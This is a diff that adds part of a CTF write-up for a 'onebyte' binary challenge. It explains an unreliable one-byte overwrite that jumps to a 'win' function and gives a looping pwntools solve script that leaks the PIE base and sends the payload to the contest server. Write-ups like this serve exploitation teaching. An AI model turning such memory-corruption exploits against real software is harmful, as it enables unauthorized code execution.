@@ -211,7 +211,71 @@ But when I ran it uhmmm it works and fails
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/754a5f54-5a6d-43b8-8981-14488dded912)
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2ac246c9-f9cc-4d68-8476-6669eaf7b6a9)
 
+Initially it took a long time before I noticed it works but then fails multiple times
 
+When I then debugged why this is so I got this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/53cfddd1-2344-4c09-a563-713376b5b4ce)
 
+After the program is about to return it will jump to `IO_file_setbuf` instead of `win`
+
+I don't know why that's happening but it sometimes jumps to `_GLOBAL_OFFSET_TABLE` or `0x0` 
+
+So the way I ended up solving this is by running it in a loop then hopefully when it spawns a shell in one of the loop process it will `cat` the flag
+
+Here's my solve script
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+filterwarnings('ignore')
+
+# Set up pwntools for the correct architecture
+context.update(arch='i386')
+exe = './onebyte'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+piebase
+break *main+110
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+for i in range(0xff+1):
+    try:
+        io = start()
+
+        io = remote('2023.ductf.dev', '30018')
+
+        io.recvuntil('Free junk:')
+        init = int(io.recvline().strip().decode(), 16)
+        elf.address = init - (0x565561bd - 0x56555000)
+        log.info("Elf base address: 0x%x", elf.address)
+        log.info("Jumping to address: 0x%x", elf.sym['win'])
+
+        payload = p32(elf.sym['win']) + b'A'*8 + b'C'*4 + b'D'
+
+        io.recvuntil('Your turn:')
+        io.send(payload)
+        io.sendline('cat flag*')
+
+        print(io.recvall().decode())
+        io.close()
+    except Exception:
+        pass
+```
 
 
